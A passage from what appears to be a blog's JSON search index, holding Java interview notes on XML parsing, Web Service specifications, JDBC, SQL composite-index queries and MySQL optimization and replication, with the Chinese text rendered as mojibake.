ç”¨çš„å†…å­˜è¾ƒå¤šï¼Œè€Œä¸”DOMå¿…é¡»åœ¨è§£ææ–‡ä»¶ä¹‹å‰æŠŠæ•´ä¸ªæ–‡æ¡£è£…å…¥å†…å­˜,é€‚åˆå¯¹XMLçš„éšæœºè®¿é—®SAX:ä¸ç°äºDOM,SAXæ˜¯äº‹ä»¶é©±åŠ¨å‹çš„XMLè§£ææ–¹å¼ã€‚å®ƒé¡ºåºè¯»å–XMLæ–‡ä»¶ï¼Œä¸éœ€è¦ä¸€æ¬¡å…¨éƒ¨è£…è½½æ•´ä¸ªæ–‡ä»¶ã€‚å½“é‡åˆ°åƒæ–‡ä»¶å¼€å¤´ï¼Œæ–‡æ¡£ç»“æŸï¼Œæˆ–è€…æ ‡ç­¾å¼€å¤´ä¸æ ‡ç­¾ç»“æŸæ—¶ï¼Œå®ƒä¼šè§¦å‘ä¸€ä¸ªäº‹ä»¶ï¼Œç”¨æˆ·é€šè¿‡åœ¨å…¶å›è°ƒäº‹ä»¶ä¸­å†™å…¥å¤„ç†ä»£ç æ¥å¤„ç†XMLæ–‡ä»¶ï¼Œé€‚åˆå¯¹XMLçš„é¡ºåºè®¿é—®STAX:Streaming API for XML (StAX)xmlæ–‡æ¡£æœ‰ä¸¤ç§å®šä¹‰æ–¹æ³•ï¼šdtdï¼šæ•°æ®ç±»å‹å®šä¹‰ï¼ˆdata type definitionï¼‰ï¼Œç”¨ä»¥æè¿°XMLæ–‡æ¡£çš„æ–‡æ¡£ç»“æ„ï¼Œæ˜¯æ—©æœŸçš„XMLæ–‡æ¡£å®šä¹‰å½¢å¼ã€‚schemaï¼šå…¶æœ¬èº«æ˜¯åŸºäºXMLè¯­è¨€ç¼–å†™çš„ï¼Œåœ¨ç±»å‹å’Œè¯­æ³•ä¸Šçš„é™å®šèƒ½åŠ›æ¯”dtdå¼ºï¼Œå¤„ç†ä¹Ÿæ¯”è¾ƒæ–¹ä¾¿ï¼Œå› ä¸ºæ­¤æ­£é€æ¸ä»£æ›¿dtdæˆä¸ºæ–°çš„æ¨¡å¼å®šä¹‰è¯­è¨€ã€‚ è°ˆä¸€è°ˆï¼ŒJavaè§„èŒƒä¸­å’Œ ä¸Web Serviceç›¸å…³çš„ è§„èŒƒæœ‰å“ªäº›ï¼ŸJavaè§„èŒƒä¸­å’ŒWeb Serviceç›¸å…³çš„æœ‰ä¸‰ä¸ªï¼š- JAX-WS(JSR 224)ï¼šè¿™ä¸ªè§„èŒƒæ˜¯æ—©æœŸçš„åŸºäºSOAPçš„Web Serviceè§„èŒƒJAX-RPCçš„æ›¿ä»£ç‰ˆæœ¬ï¼Œå®ƒå¹¶ä¸æä¾›å‘ä¸‹å…¼å®¹æ€§ï¼Œå› ä¸ºRPCæ ·å¼çš„WSDLä»¥åŠç›¸å…³çš„APIå·²ç»åœ¨Java EE5ä¸­è¢«ç§»é™¤äº†ã€‚WS-MetaDataæ˜¯JAX-WSçš„ä¾èµ–è§„èŒƒï¼Œæä¾›äº†åŸºäºæ³¨è§£é…ç½®Web Serviceå’ŒSOAPæ¶ˆæ¯çš„ç›¸å…³APIã€‚- JAXM(JSR 67)ï¼šå®šä¹‰äº†å‘é€å’Œæ¥æ”¶æ¶ˆæ¯æ‰€éœ€çš„API,ç›¸å½“äºWeb Serviceçš„æœåŠ¡å™¨ç«¯ã€‚- JAX-RS(JSR 311 &amp; JSR 339 &amp; JSR 370)ï¼šæ˜¯Javaé’ˆå¯¹RESTï¼ˆRepresentation State Transferï¼‰æ¶æ„é£æ ¼åˆ¶å®šçš„ä¸€å¥—Web Serviceè§„èŒƒã€‚RESTæ˜¯ä¸€ç§è½¯ä»¶æ¶æ„æ¨¡å¼ï¼Œæ˜¯ä¸€ç§é£æ ¼ï¼Œå®ƒä¸åƒSOAPé‚£æ ·æœ¬èº«æ‰¿è½½ç€ä¸€ç§æ¶ˆæ¯åè®®ï¼Œ (ä¸¤ç§é£æ ¼çš„Web Serviceå‡é‡‡ç”¨äº†HTTPåšä¼ è¾“åè®®ï¼Œå› ä¸ºHTTPåè®®èƒ½ç©¿è¶Šé˜²ç«å¢™ï¼ŒJavaçš„è¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼ˆRMIï¼‰ç­‰æ˜¯é‡é‡çº§åè®®ï¼Œé€šå¸¸ä¸èƒ½ç©¿è¶Šé˜²ç«å¢™ï¼‰ï¼Œå› æ­¤å¯ä»¥å°†RESTè§†ä¸ºåŸºäºHTTPåè®®çš„è½¯ä»¶æ¶æ„ã€‚RESTä¸­æœ€é‡è¦çš„ä¸¤ä¸ªæ¦‚å¿µæ˜¯èµ„æºå®šä½å’Œèµ„æºæ“ä½œï¼Œè€ŒHTTPåè®®æ°å¥½å®Œæ•´çš„æä¾›äº†è¿™ä¸¤ä¸ªç‚¹ã€‚HTTPåè®®ä¸­çš„URIå¯ä»¥å®Œæˆèµ„æºå®šä½ï¼Œè€ŒGETã€POSTã€OPTIONã€DELETEæ–¹æ³•å¯ä»¥å®Œæˆèµ„æºæ“ä½œã€‚å› æ­¤RESTå®Œå…¨ä¾èµ–HTTPåè®®å°±å¯ä»¥å®ŒæˆWeb Serviceï¼Œè€Œä¸åƒSOAPåè®®é‚£æ ·åªåˆ©ç”¨äº†HTTPçš„ä¼ è¾“ç‰¹æ€§ï¼Œå®šä½å’Œæ“ä½œéƒ½æ˜¯ç”±SOAPåè®®è‡ªèº«å®Œæˆçš„ï¼Œä¹Ÿæ­£æ˜¯ç”±äºSOAPæ¶ˆæ¯çš„å­˜åœ¨ä½¿å¾—åŸºäºSOAPçš„Web Serviceæ˜¾å¾—ç¬¨é‡è€Œé€æ¸è¢«æ·˜æ±°ã€‚ è¯·ä½ è°ˆè°ˆå¯¹SOAPã€WSDLã€UDDIçš„äº†è§£ã€‚- SOAPï¼šç®€å•å¯¹è±¡è®¿é—®åè®®ï¼ˆSimple Object Access Protocolï¼‰ï¼Œæ˜¯Web Serviceä¸­äº¤æ¢æ•°æ®çš„ä¸€ç§åè®®è§„èŒƒã€‚- WSDLï¼šWebæœåŠ¡æè¿°è¯­è¨€ï¼ˆWeb Service Description Languageï¼‰ï¼Œå®ƒæè¿°äº†WebæœåŠ¡çš„å…¬å…±æ¥å£ã€‚è¿™æ˜¯ä¸€ä¸ªåŸºäºXMLçš„å…³äºå¦‚ä½•ä¸WebæœåŠ¡é€šè®¯å’Œä½¿ç”¨çš„æœåŠ¡æè¿°ï¼›ä¹Ÿå°±æ˜¯æè¿°ä¸ç›®å½•ä¸­åˆ—å‡ºçš„WebæœåŠ¡è¿›è¡Œäº¤äº’æ—¶éœ€è¦ç»‘å®šçš„åè®®å’Œä¿¡æ¯æ ¼å¼ã€‚é€šå¸¸é‡‡ç”¨æŠ½è±¡è¯­è¨€æè¿°è¯¥æœåŠ¡æ”¯æŒçš„æ“ä½œå’Œä¿¡æ¯ï¼Œä½¿ç”¨çš„æ—¶å€™å†å°†å®é™…çš„ç½‘ç»œåè®®å’Œä¿¡æ¯æ ¼å¼ç»‘å®šç»™è¯¥æœåŠ¡ã€‚- UDDIï¼šç»Ÿä¸€æè¿°ã€å‘ç°å’Œé›†æˆï¼ˆUniversal Description, Discovery and Integrationï¼‰ï¼Œå®ƒæ˜¯ä¸€ä¸ªåŸºäºXMLçš„è·¨å¹³å°çš„æè¿°è§„èŒƒï¼Œå¯ä»¥ä½¿ä¸–ç•ŒèŒƒå›´å†…çš„ä¼ä¸šåœ¨äº’è”ç½‘ä¸Šå‘å¸ƒè‡ªå·±æ‰€æä¾›çš„æœåŠ¡ã€‚ç®€å•çš„è¯´ï¼ŒUDDIæ˜¯è®¿é—®å„ç§WSDLçš„ä¸€ä¸ªé—¨é¢ï¼ˆå¯ä»¥å‚è€ƒè®¾è®¡æ¨¡å¼ä¸­çš„é—¨é¢æ¨¡å¼ï¼‰ã€‚ WEB SERVICEåè¯è§£é‡Šï¼ŒJSWDLå¼€å‘åŒ…çš„ä»‹ç»ï¼ŒJAXPã€JAXMçš„è§£é‡Šã€‚SOAPã€UDDI,WSDLè§£é‡Šã€‚Web ServiceWeb Serviceæ˜¯åŸºäºç½‘ç»œçš„ã€åˆ†å¸ƒå¼çš„æ¨¡å—åŒ–ç»„ä»¶ï¼Œå®ƒæ‰§è¡Œç‰¹å®šçš„ä»»åŠ¡ï¼Œéµå®ˆå…·ä½“çš„æŠ€æœ¯è§„èŒƒï¼Œè¿™äº›è§„èŒƒä½¿å¾—WebServiceèƒ½ä¸å…¶ä»–å…¼å®¹çš„ç»„ä»¶è¿›è¡Œäº’æ“ä½œã€‚JAXP(Java API for XML Parsing) å®šä¹‰äº†åœ¨Javaä¸­ä½¿ç”¨DOM, SAX, XSLTçš„é€šç”¨çš„æ¥å£ã€‚è¿™æ ·åœ¨ä½ çš„ç¨‹åºä¸­ä½ åªè¦ä½¿ç”¨è¿™äº›é€šç”¨çš„æ¥å£ï¼Œå½“ä½ éœ€è¦æ”¹å˜å…·ä½“çš„å®ç°æ—¶å€™ä¹Ÿä¸éœ€è¦ä¿®æ”¹ä»£ç ã€‚JAXM(Java API for XML Messaging) æ˜¯ä¸ºSOAPé€šä¿¡æä¾›è®¿é—®æ–¹æ³•å’Œä¼ è¾“æœºåˆ¶çš„APIã€‚WSDLæ˜¯ä¸€ç§ XML æ ¼å¼ï¼Œç”¨äºå°†ç½‘ç»œæœåŠ¡æè¿°ä¸ºä¸€ç»„ç«¯ç‚¹ï¼Œè¿™äº›ç«¯ç‚¹å¯¹åŒ…å«é¢å‘æ–‡æ¡£ä¿¡æ¯æˆ–é¢å‘è¿‡ç¨‹ä¿¡æ¯çš„æ¶ˆæ¯è¿›è¡Œæ“ä½œã€‚è¿™ç§æ ¼å¼é¦–å…ˆå¯¹æ“ä½œå’Œæ¶ˆæ¯è¿›è¡ŒæŠ½è±¡æè¿°ï¼Œç„¶åå°†å…¶ç»‘å®šåˆ°å…·ä½“çš„ç½‘ç»œåè®®å’Œæ¶ˆæ¯æ ¼å¼ä¸Šä»¥å®šä¹‰ç«¯ç‚¹ã€‚ç›¸å…³çš„å…·ä½“ç«¯ç‚¹å³ç»„åˆæˆä¸ºæŠ½è±¡ç«¯ç‚¹ï¼ˆæœåŠ¡ï¼‰ã€‚SOAPå³ç®€å•å¯¹è±¡è®¿é—®åè®®(Simple Object Access Protocol)ï¼Œå®ƒæ˜¯ç”¨äºäº¤æ¢XMLç¼–ç ä¿¡æ¯çš„è½»é‡çº§åè®®ã€‚UDDI çš„ç›®çš„æ˜¯ä¸ºç”µå­å•†åŠ¡å»ºç«‹æ ‡å‡†ï¼›UDDIæ˜¯ä¸€å¥—åŸºäºWebçš„ã€åˆ†å¸ƒå¼çš„ã€ä¸ºWeb Serviceæä¾›çš„ã€ä¿¡æ¯æ³¨å†Œä¸­å¿ƒçš„å®ç°æ ‡å‡†è§„èŒƒï¼ŒåŒæ—¶ä¹ŸåŒ…å«ä¸€ç»„ä½¿ä¼ä¸šèƒ½å°†è‡ªèº«æä¾›çš„Web Serviceæ³¨å†Œï¼Œä»¥ä½¿åˆ«çš„ä¼ä¸šèƒ½å¤Ÿå‘ç°çš„è®¿é—®åè®®çš„å®ç°æ ‡å‡†ã€‚soapæ˜¯web serviceæœ€å…³é”®çš„æŠ€æœ¯ï¼Œæ˜¯web serviceä¸­æ•°æ®å’Œæ–¹æ³•è°ƒä¼ è¾“çš„ä»‹è´¨ã€‚WSDLï¼ˆweb service definition languageï¼‰æè¿°äº†web serviceçš„æ¥å£å’ŒåŠŸèƒ½ã€‚","categories":[],"tags":[{"name":"Interview","slug":"Interview","permalink":"https://blog.kayleh.top/tags/Interview/"}]},{"title":"JDBC","slug":"JDBC","date":"2020-07-15T23:06:43.000Z","updated":"2021-04-11T17:11:28.208Z","comments":true,"path":"JDBC/","link":"","permalink":"https://blog.kayleh.top/JDBC/","excerpt":"JDBC","text":"JDBC SQLç°åœ¨æœ‰ä¸€ä¸ªå­¦ç”Ÿè¡¨ï¼Œä¸€ä¸ªè¯¾ç¨‹æˆç»©è¡¨ï¼Œè¯·é—®ï¼Œæ€ä¹ˆæ‰¾å‡ºå­¦ç”Ÿè¯¾ç¨‹çš„æœ€é«˜åˆ†æ•°ï¼Œè°ˆä¸€è°ˆæ€è·¯ç°åœ¨ï¼Œæœ‰ä¸€ä¸ªç»„åˆç´¢å¼•ï¼ˆA,B,Cï¼‰ï¼Œå¯ä»¥æœ‰å“ªå‡ ç§æŸ¥è¯¢æ–¹å¼ï¼Ÿä¼˜: select * from test where a=10 and b&gt;50 å·®: select * from test where b = 50 ä¼˜: select * from test order by a å·®: select * from test order by b å·®: select * from test order by c ä¼˜: select * from test where a=10 order by a ä¼˜: select * from test where a=10 order by b å·®: select * from test where a=10 order by c ä¼˜: select * from test where a&gt;10 order by a å·®: select * from test where a&gt;10 order by b å·®: select * from test where a&gt;10 order by c ä¼˜: select * from test where a=10 and b=10 order by a ä¼˜: select * from test where a=10 and b=10 order by b ä¼˜: select * from test where a=10 and b=10 order by c ä¼˜: select * from test where a=10 and b=10 order by a ä¼˜: select * from test where a=10 and b&gt;10 order by b å·®: select * from test where a=10 and b&gt;10 order by c å†™SQLï¼šæ‰¾å‡ºæ¯ä¸ªåŸå¸‚çš„æœ€æ–°ä¸€æ¡è®°å½•ã€‚ id åŸå¸‚ äººå£ ä¿¡æ¯ åˆ›å»ºæ—¶é—´1 åŒ—äº¬ 100 info1 æ—¶é—´æˆ³2 åŒ—äº¬ 100 info2 æ—¶é—´æˆ³3 ä¸Šæµ· 100 info3 æ—¶é—´æˆ³4 ä¸Šæµ· 100 info4 æ—¶é—´æˆ³ è¯·ä½ è®²è§£ä¸€ä¸‹æ•°æ®è¿æ¥æ± çš„å·¥ä½œæœºåˆ¶?J2EE æœåŠ¡å™¨å¯åŠ¨æ—¶ä¼šå»ºç«‹ä¸€å®šæ•°é‡çš„æ± è¿æ¥ï¼Œå¹¶ä¸€ç›´ç»´æŒä¸å°‘äºæ­¤æ•°ç›®çš„æ± è¿æ¥ã€‚å®¢æˆ·ç«¯ç¨‹åºéœ€è¦è¿æ¥æ—¶ï¼Œæ± é©±åŠ¨ç¨‹åºä¼šè¿”å›ä¸€ä¸ªæœªä½¿ç”¨çš„æ± è¿æ¥å¹¶å°†å…¶è¡¨è®°ä¸ºå¿™ã€‚å¦‚æœå½“å‰æ²¡æœ‰ç©ºé—²è¿æ¥ï¼Œæ± é©±åŠ¨ç¨‹åºå°±æ–°å»ºä¸€å®šæ•°é‡çš„è¿æ¥ï¼Œæ–°å»ºè¿æ¥çš„æ•°é‡ç”±é…ç½®å‚æ•°å†³å®šã€‚å½“ä½¿ç”¨çš„æ± è¿æ¥è°ƒç”¨å®Œæˆåï¼Œæ± é©±åŠ¨ç¨‹åºå°†æ­¤è¿æ¥è¡¨è®°ä¸ºç©ºé—²ï¼Œå…¶ä»–è°ƒç”¨å°±å¯ä»¥ä½¿ç”¨è¿™ä¸ªè¿æ¥ã€‚ äº†è§£ç»§æ‰¿æ˜ å°„å—ï¼Œè¯·ç®€å•è®²è®²ä½ çš„ç†è§£ã€‚â‘  æ¯ä¸ªç»§æ‰¿ç»“æ„ä¸€å¼ è¡¨ï¼ˆtable per class hierarchyï¼‰ï¼Œä¸ç®¡å¤šå°‘ä¸ªå­ç±»éƒ½ç”¨ä¸€å¼ è¡¨ã€‚â‘¡ æ¯ä¸ªå­ç±»ä¸€å¼ è¡¨ï¼ˆtable per subclassï¼‰ï¼Œå…¬å…±ä¿¡æ¯æ”¾ä¸€å¼ è¡¨ï¼Œç‰¹æœ‰ä¿¡æ¯æ”¾å•ç‹¬çš„è¡¨ã€‚â‘¢ æ¯ä¸ªå…·ä½“ç±»ä¸€å¼ è¡¨ï¼ˆtable per concrete classï¼‰ï¼Œæœ‰å¤šå°‘ä¸ªå­ç±»å°±æœ‰å¤šå°‘å¼ è¡¨ã€‚ç¬¬ä¸€ç§æ–¹å¼å±äºå•è¡¨ç­–ç•¥ï¼Œå…¶ä¼˜ç‚¹åœ¨äºæŸ¥è¯¢å­ç±»å¯¹è±¡çš„æ—¶å€™æ— éœ€è¡¨è¿æ¥ï¼ŒæŸ¥è¯¢é€Ÿåº¦å¿«ï¼Œé€‚åˆå¤šæ€æŸ¥è¯¢ï¼›ç¼ºç‚¹æ˜¯å¯èƒ½å¯¼è‡´è¡¨å¾ˆå¤§ã€‚åä¸¤ç§æ–¹å¼å±äºå¤šè¡¨ç­–ç•¥ï¼Œå…¶ä¼˜ç‚¹åœ¨äºæ•°æ®å­˜å‚¨ç´§å‡‘ï¼Œå…¶ç¼ºç‚¹æ˜¯éœ€è¦è¿›è¡Œè¿æ¥æŸ¥è¯¢ï¼Œä¸é€‚åˆå¤šæ€æŸ¥è¯¢ã€‚ è¯·ä»‹ç»ä¸€äº›ä½ äº†è§£çš„æ•°æ®åº“ä¼˜åŒ–æ–¹æ³•ï¼ˆ1ï¼‰é€‰å–æœ€é€‚ç”¨çš„å­—æ®µå±æ€§ MySQLå¯ä»¥å¾ˆå¥½çš„æ”¯æŒå¤§æ•°æ®é‡çš„å­˜å–ï¼Œä½†æ˜¯ä¸€èˆ¬è¯´æ¥ï¼Œæ•°æ®åº“ä¸­çš„è¡¨è¶Šå°ï¼Œåœ¨å®ƒä¸Šé¢æ‰§è¡Œçš„æŸ¥è¯¢ä¹Ÿå°±ä¼šè¶Šå¿«ã€‚å› æ­¤ï¼Œåœ¨åˆ›å»ºè¡¨çš„æ—¶å€™ï¼Œä¸ºäº†è·å¾—æ›´å¥½çš„æ€§èƒ½ï¼Œæˆ‘ä»¬å¯ä»¥å°†è¡¨ä¸­å­—æ®µçš„å®½åº¦è®¾å¾—å°½å¯èƒ½å°ã€‚ ä¾‹å¦‚ï¼Œåœ¨å®šä¹‰é‚®æ”¿ç¼–ç è¿™ä¸ªå­—æ®µæ—¶ï¼Œå¦‚æœå°†å…¶è®¾ç½®ä¸ºCHAR(255),æ˜¾ç„¶ç»™æ•°æ®åº“å¢åŠ äº†ä¸å¿…è¦çš„ç©ºé—´ï¼Œç”šè‡³ä½¿ç”¨VARCHARè¿™ç§ç±»å‹ä¹Ÿæ˜¯å¤šä½™çš„ï¼Œå› ä¸ºCHAR(6)å°±å¯ä»¥å¾ˆå¥½çš„å®Œæˆä»»åŠ¡äº†ã€‚åŒæ ·çš„ï¼Œå¦‚æœå¯ä»¥çš„è¯ï¼Œæˆ‘ä»¬åº”è¯¥ä½¿ç”¨MEDIUMINTè€Œä¸æ˜¯BIGINæ¥å®šä¹‰æ•´å‹å­—æ®µã€‚ å¦å¤–ä¸€ä¸ªæé«˜æ•ˆç‡çš„æ–¹æ³•æ˜¯åœ¨å¯èƒ½çš„æƒ…å†µä¸‹ï¼Œåº”è¯¥å°½é‡æŠŠå­—æ®µè®¾ç½®ä¸ºNOTNULLï¼Œè¿™æ ·åœ¨å°†æ¥æ‰§è¡ŒæŸ¥è¯¢çš„æ—¶å€™ï¼Œæ•°æ®åº“ä¸ç”¨å»æ¯”è¾ƒNULLå€¼ã€‚å¯¹äºæŸäº›æ–‡æœ¬å­—æ®µï¼Œä¾‹å¦‚â€œçœä»½â€æˆ–è€…â€œæ€§åˆ«â€ï¼Œæˆ‘ä»¬å¯ä»¥å°†å®ƒä»¬å®šä¹‰ä¸ºENUMç±»å‹ã€‚å› ä¸ºåœ¨MySQLä¸­ï¼ŒENUMç±»å‹è¢«å½“ä½œæ•°å€¼å‹æ•°æ®æ¥å¤„ç†ï¼Œè€Œæ•°å€¼å‹æ•°æ®è¢«å¤„ç†èµ·æ¥çš„é€Ÿåº¦è¦æ¯”æ–‡æœ¬ç±»å‹å¿«å¾—å¤šã€‚è¿™æ ·ï¼Œæˆ‘ä»¬åˆå¯ä»¥æé«˜æ•°æ®åº“çš„æ€§èƒ½ã€‚ ï¼ˆ2ï¼‰ä½¿ç”¨è¿æ¥ï¼ˆJOINï¼‰æ¥ä»£æ›¿å­æŸ¥è¯¢(Sub-Queries) MySQLä»4.1å¼€å§‹æ”¯æŒSQLçš„å­æŸ¥è¯¢ã€‚è¿™ä¸ªæŠ€æœ¯å¯ä»¥ä½¿ç”¨SELECTè¯­å¥æ¥åˆ›å»ºä¸€ä¸ªå•åˆ—çš„æŸ¥è¯¢ç»“æœï¼Œç„¶åæŠŠè¿™ä¸ªç»“æœä½œä¸ºè¿‡æ»¤æ¡ä»¶ç”¨åœ¨å¦ä¸€ä¸ªæŸ¥è¯¢ä¸­ã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬è¦å°†å®¢æˆ·åŸºæœ¬ä¿¡æ¯è¡¨ä¸­æ²¡æœ‰ä»»ä½•è®¢å•çš„å®¢æˆ·åˆ é™¤æ‰ï¼Œå°±å¯ä»¥åˆ©ç”¨å­æŸ¥è¯¢å…ˆä»é”€å”®ä¿¡æ¯è¡¨ä¸­å°†æ‰€æœ‰å‘å‡ºè®¢å•çš„å®¢æˆ·IDå–å‡ºæ¥ï¼Œç„¶åå°†ç»“æœä¼ é€’ç»™ä¸»æŸ¥è¯¢ ï¼ˆ3ï¼‰ä½¿ç”¨è”åˆ(UNION)æ¥ä»£æ›¿æ‰‹åŠ¨åˆ›å»ºçš„ä¸´æ—¶è¡¨ MySQLä»4.0çš„ç‰ˆæœ¬å¼€å§‹æ”¯æŒunionæŸ¥è¯¢ï¼Œå®ƒå¯ä»¥æŠŠéœ€è¦ä½¿ç”¨ä¸´æ—¶è¡¨çš„ä¸¤æ¡æˆ–æ›´å¤šçš„selectæŸ¥è¯¢åˆå¹¶çš„ä¸€ä¸ªæŸ¥è¯¢ä¸­ã€‚åœ¨å®¢æˆ·ç«¯çš„æŸ¥è¯¢ä¼šè¯ç»“æŸçš„æ—¶å€™ï¼Œä¸´æ—¶è¡¨ä¼šè¢«è‡ªåŠ¨åˆ é™¤ï¼Œä»è€Œä¿è¯æ•°æ®åº“æ•´é½ã€é«˜æ•ˆã€‚ä½¿ç”¨unionæ¥åˆ›å»ºæŸ¥è¯¢çš„æ—¶å€™ï¼Œæˆ‘ä»¬åªéœ€è¦ç”¨UNIONä½œä¸ºå…³é”®å­—æŠŠå¤šä¸ªselectè¯­å¥è¿æ¥èµ·æ¥å°±å¯ä»¥äº†ï¼Œè¦æ³¨æ„çš„æ˜¯æ‰€æœ‰selectè¯­å¥ä¸­çš„å­—æ®µæ•°ç›®è¦æƒ³åŒã€‚ä¸‹é¢çš„ä¾‹å­å°±æ¼”ç¤ºäº†ä¸€ä¸ªä½¿ç”¨UNIONçš„æŸ¥è¯¢ã€‚ ï¼ˆ4ï¼‰äº‹åŠ¡ å°½ç®¡æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å­æŸ¥è¯¢ï¼ˆSub-Queriesï¼‰ã€è¿æ¥ï¼ˆJOINï¼‰å’Œè”åˆï¼ˆUNIONï¼‰æ¥åˆ›å»ºå„ç§å„æ ·çš„æŸ¥è¯¢ï¼Œä½†ä¸æ˜¯æ‰€æœ‰çš„æ•°æ®åº“æ“ä½œéƒ½å¯ä»¥åªç”¨ä¸€æ¡æˆ–å°‘æ•°å‡ æ¡SQLè¯­å¥å°±å¯ä»¥å®Œæˆçš„ã€‚æ›´å¤šçš„æ—¶å€™æ˜¯éœ€è¦ç”¨åˆ°ä¸€ç³»åˆ—çš„è¯­å¥æ¥å®ŒæˆæŸç§å·¥ä½œã€‚ä½†æ˜¯åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå½“è¿™ä¸ªè¯­å¥å—ä¸­çš„æŸä¸€æ¡è¯­å¥è¿è¡Œå‡ºé”™çš„æ—¶å€™ï¼Œæ•´ä¸ªè¯­å¥å—çš„æ“ä½œå°±ä¼šå˜å¾—ä¸ç¡®å®šèµ·æ¥ã€‚è®¾æƒ³ä¸€ä¸‹ï¼Œè¦æŠŠæŸä¸ªæ•°æ®åŒæ—¶æ’å…¥ä¸¤ä¸ªç›¸å…³è”çš„è¡¨ä¸­ï¼Œå¯èƒ½ä¼šå‡ºç°è¿™æ ·çš„æƒ…å†µï¼šç¬¬ä¸€ä¸ªè¡¨ä¸­æˆåŠŸæ›´æ–°åï¼Œæ•°æ®åº“çªç„¶å‡ºç°æ„å¤–çŠ¶å†µï¼Œé€ æˆç¬¬äºŒä¸ªè¡¨ä¸­çš„æ“ä½œæ²¡æœ‰å®Œæˆï¼Œè¿™æ ·ï¼Œå°±ä¼šé€ æˆæ•°æ®çš„ä¸å®Œæ•´ï¼Œç”šè‡³ä¼šç ´åæ•°æ®åº“ä¸­çš„æ•°æ®ã€‚è¦é¿å…è¿™ç§æƒ…å†µï¼Œå°±åº”è¯¥ä½¿ç”¨äº‹åŠ¡ï¼Œå®ƒçš„ä½œç”¨æ˜¯ï¼šè¦ä¹ˆè¯­å¥å—ä¸­æ¯æ¡è¯­å¥éƒ½æ“ä½œæˆåŠŸï¼Œè¦ä¹ˆéƒ½å¤±è´¥ã€‚æ¢å¥è¯è¯´ï¼Œå°±æ˜¯å¯ä»¥ä¿æŒæ•°æ®åº“ä¸­æ•°æ®çš„ä¸€è‡´æ€§å’Œå®Œæ•´æ€§ã€‚äº‹ç‰©ä»¥BEGINå…³é”®å­—å¼€å§‹ï¼ŒCOMMITå…³é”®å­—ç»“æŸã€‚åœ¨è¿™ä¹‹é—´çš„ä¸€æ¡SQLæ“ä½œå¤±è´¥ï¼Œé‚£ä¹ˆï¼ŒROLLBACKå‘½ä»¤å°±å¯ä»¥æŠŠæ•°æ®åº“æ¢å¤åˆ°BEGINå¼€å§‹ä¹‹å‰çš„çŠ¶æ€ã€‚ è¯´æ˜ä¸€ä¸‹ left join å’Œ right join çš„åŒºåˆ«ï¼Ÿleft join(å·¦è”æ¥) è¿”å›åŒ…æ‹¬å·¦è¡¨ä¸­çš„æ‰€æœ‰è®°å½•å’Œå³è¡¨ä¸­è”ç»“å­—æ®µç›¸ç­‰çš„è®°å½•right join(å³è”æ¥) è¿”å›åŒ…æ‹¬å³è¡¨ä¸­çš„æ‰€æœ‰è®°å½•å’Œå·¦è¡¨ä¸­è”ç»“å­—æ®µç›¸ç­‰çš„è®°å½• æ¯”å¦‚ï¼š è¡¨Aè®°å½•å¦‚ä¸‹ï¼šaID aNum1 a200501112 a200501123 a200501134 a200501145 a20050115 è¡¨Bè®°å½•å¦‚ä¸‹:bID bName1 20060324012 20060324023 20060324034 20060324048 2006032408 left joinæ˜¯ä»¥Aè¡¨çš„è®°å½•ä¸ºåŸºç¡€çš„,Aå¯ä»¥çœ‹æˆå·¦è¡¨,Bå¯ä»¥çœ‹æˆå³è¡¨,left joinæ˜¯ä»¥å·¦è¡¨ä¸ºå‡†çš„.æ¢å¥è¯è¯´,å·¦è¡¨(A)çš„è®°å½•å°†ä¼šå…¨éƒ¨è¡¨ç¤ºå‡ºæ¥,è€Œå³è¡¨(B)åªä¼šæ˜¾ç¤ºç¬¦åˆæœç´¢æ¡ä»¶çš„è®°å½•(ä¾‹å­ä¸­ä¸º: A.aID = B.bID).Bè¡¨è®°å½•ä¸è¶³çš„åœ°æ–¹å‡ä¸ºNULL. ä»‹ç»ä¸€ä¸‹ mysqlçš„ä¸»ä»å¤åˆ¶ï¼ŸMySQLä¸»ä»å¤åˆ¶æ˜¯å…¶æœ€é‡è¦çš„åŠŸèƒ½ä¹‹ä¸€ã€‚ä¸»ä»å¤åˆ¶æ˜¯æŒ‡ä¸€å°æœåŠ¡å™¨å……å½“ä¸»æ•°æ®åº“æœåŠ¡å™¨ï¼Œå¦ä¸€å°æˆ–å¤šå°æœåŠ¡å™¨å……å½“ä»æ•°æ®åº“æœåŠ¡å™¨ï¼Œä¸»æœåŠ¡å™¨ä¸­çš„æ•°æ®è‡ªåŠ¨å¤åˆ¶åˆ°ä»æœåŠ¡å™¨ä¹‹ä¸­ã€‚å¯¹äºå¤šçº§å¤åˆ¶ï¼Œæ•°æ®åº“æœåŠ¡å™¨å³å¯å……å½“ä¸»æœºï¼Œä¹Ÿå¯å……å½“ä»æœºã€‚MySQLä¸»ä»å¤åˆ¶çš„åŸºç¡€æ˜¯ä¸»æœåŠ¡å™¨å¯¹æ•°æ®åº“ä¿®æ”¹è®°å½•äºŒè¿›åˆ¶æ—¥å¿—ï¼Œä»æœåŠ¡å™¨é€šè¿‡ä¸»æœåŠ¡å™¨çš„äºŒè¿›åˆ¶æ—¥å¿—è‡ªåŠ¨æ‰§è¡Œæ›´æ–°ã€‚ MySQLä¸»ä»å¤åˆ¶çš„ä¸¤ç§æƒ…å†µï¼šåŒæ­¥å¤åˆ¶å’Œå¼‚æ­¥å¤åˆ¶ï¼Œå®é™…å¤åˆ¶æ¶æ„ä¸­å¤§éƒ¨åˆ†ä¸ºå¼‚æ­¥å¤åˆ¶ã€‚ å¤åˆ¶çš„åŸºæœ¬è¿‡ç¨‹å¦‚ä¸‹ï¼š Slaveä¸Šé¢çš„IOè¿›ç¨‹è¿æ¥ä¸ŠMasterï¼Œå¹¶è¯·æ±‚ä»æŒ‡å®šæ—¥å¿—æ–‡ä»¶çš„æŒ‡å®šä½ç½®ï¼ˆæˆ–è€…ä»æœ€å¼€å§‹çš„æ—¥å¿—ï¼‰ä¹‹åçš„æ—¥å¿—å†…å®¹ã€‚ Masteræ¥æ”¶åˆ°æ¥è‡ªSlaveçš„IOè¿›ç¨‹çš„è¯·æ±‚åï¼Œè´Ÿè´£å¤åˆ¶çš„IOè¿›ç¨‹ä¼šæ 